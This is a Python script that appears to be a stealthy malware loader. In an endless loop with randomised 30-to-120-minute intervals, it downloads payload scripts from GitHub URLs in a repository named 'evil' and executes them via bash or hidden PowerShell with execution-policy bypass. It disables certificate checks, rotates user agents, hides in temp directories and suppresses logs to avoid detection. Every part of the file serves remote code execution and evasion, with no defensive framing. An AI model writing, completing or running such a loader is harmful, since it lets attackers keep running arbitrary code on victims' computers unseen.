import subprocess
import time
import urllib.request
import ssl
import random
import os
import platform

# Configuration - Modify these for stealth
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'curl/7.68.0',
    'Wget/1.20.3'
]

# Use different URL formats or domains
URL_SOURCES = [
    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.sh",
    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.txt",
    # Add alternative mirrors here
]

def create_ssl_context():
    """Create SSL context to avoid certificate issues"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

def stealth_download(url):
    """Stealth download with random user agents and delays"""
    try:
        # Random delay to avoid pattern detection
        time.sleep(random.uniform(1, 5))
        
        # Create request with random user agent
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
        )
        
        # Download with SSL context
        context = create_ssl_context()
        with urllib.request.urlopen(req, context=context, timeout=30) as response:
            return response.read().decode('utf-8')
            
    except Exception as e:
        return None

def obfuscated_execute(script_content, script_name):
    """Execute with obfuscation techniques"""
    try:
        # Add random delays
        time.sleep(random.uniform(2, 10))
        
        system_platform = platform.system().lower()
        
        if system_platform == "windows":
            if script_name.endswith('.ps1'):
                result = subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
                    capture_output=True, 
                    text=True, 
                    timeout=300,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                # Try multiple execution methods
                result = subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
                    capture_output=True, 
                    text=True, 
                    timeout=300,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
        else:
            # Linux/Mac execution
            result = subprocess.run(
                ["bash", "-c", script_content],
                capture_output=True, 
                text=True, 
                timeout=300
            )
            
        return result
        
    except Exception as e:
        return None

def clean_logs():
    """Minimize logging footprint"""
    pass  # Implement log cleaning if needed

def change_working_directory():
    """Change working directory to avoid detection"""
    try:
        common_dirs = [
            os.path.expanduser("~/.cache"),
            os.path.expanduser("~/AppData/Local/Temp"),
            "/tmp",
            "/var/tmp"
        ]
        
        for directory in common_dirs:
            if os.path.exists(directory):
                os.chdir(directory)
                break
    except:
        pass

def process_scripts_stealth():
    """Stealth script processing"""
    successful_downloads = 0
    
    for i, url in enumerate(URL_SOURCES, 1):
        script_name = url.split('/')[-1]
        
        # Download with stealth
        script_content = stealth_download(url)
        
        if script_content and script_content.strip():
            successful_downloads += 1
            
            # Execute with obfuscation
            execute_result = obfuscated_execute(script_content, script_name)
            
            if execute_result and execute_result.returncode == 0:
                pass  # Success - minimal logging
            else:
                pass  # Failure - minimal logging
        else:
            pass  # Download failed - minimal logging
    
    return successful_downloads

def main_loop():
    """Main continuous loop with variable intervals"""
    iteration = 0
    
    while True:
        try:
            iteration += 1
            
            # Variable sleep time to avoid patterns
            base_sleep = random.randint(1800, 7200)  # 30 mins to 2 hours
            jitter = random.randint(-300, 300)  # ±5 minutes
            sleep_time = max(60, base_sleep + jitter)  # Minimum 1 minute
            
            # Process scripts
            successful_downloads = process_scripts_stealth()
            
            # Calculate next run time
            next_run = time.time() + sleep_time
            next_run_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(next_run))
            
            # Minimal status output
            if iteration % 10 == 0:  # Only log every 10th iteration
                print(f"[{time.strftime('%H:%M:%S')}] Cycle {iteration} completed. Next: {next_run_str}")
            
            # Sleep until next execution
            time.sleep(sleep_time)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            # Error recovery with random delay
            error_delay = random.randint(60, 600)
            time.sleep(error_delay)

if __name__ == "__main__":
    # Initial setup
    change_working_directory()
    
    # Start main loop
    main_loop()
